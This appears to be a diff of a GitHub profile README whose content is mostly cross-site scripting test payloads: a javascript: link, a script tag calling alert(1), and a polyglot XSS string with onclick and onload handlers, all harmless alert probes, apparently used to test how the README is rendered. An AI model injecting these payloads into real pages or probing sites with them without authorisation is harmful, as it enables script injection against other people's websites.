@@ -1,6 +1,6 @@
 ### Hi there 👋
 
-<a href="javascript:alert('XSS')">Click Me</a>
+!!!--~~~!~~@~!@~!@~@~#~#@T#%^$&^&(_)+)<a href="javascript:alert('XSS')">Click Me</a>
 "-->%00</p>"-->%00<script>alert(1)</script><p>test
   jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
   
